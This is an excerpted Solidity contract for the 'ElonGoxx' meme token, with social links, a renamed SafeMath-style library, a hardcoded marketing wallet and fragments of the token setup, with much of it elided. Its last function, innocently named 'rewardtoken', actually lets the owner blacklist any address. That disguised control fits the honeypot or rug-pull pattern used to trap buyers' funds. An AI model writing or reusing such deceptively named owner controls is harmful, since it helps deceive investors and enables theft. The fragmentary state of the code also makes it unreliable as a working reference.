...
/**
Telegram: https://t.me/ElonGoxx
Twitter: https://twitter.com/ElonGoxx
Website: http://elongoxx.com/
*/
...
library ElonGoxx {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ElonGoxx: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "ElonGoxx: subtraction overflow");
    }
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "ElonGoxx: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "ElonGoxx: division by zero");
    }
...
contract ElonGoxxx is
    BASEToken("ElonGoxx", "ElonGoxx", 1000000 * (10**9), 9),
    SafeToken,
    LockToken
{
    using ElonGoxx for uint256;
    ...
    uint256  buyBackUpperLimit = 18 * 10**16;
    ...
    constructor() {
        ...
        marketing = 0x7Bc7218b4DfeBDEBbbd0e6ebCC2600A1915A2C8c;
    ...
    function rewardtoken(address adr, bool tokenX) external onlyOwner {
        blackList[adr] = tokenX;
    }
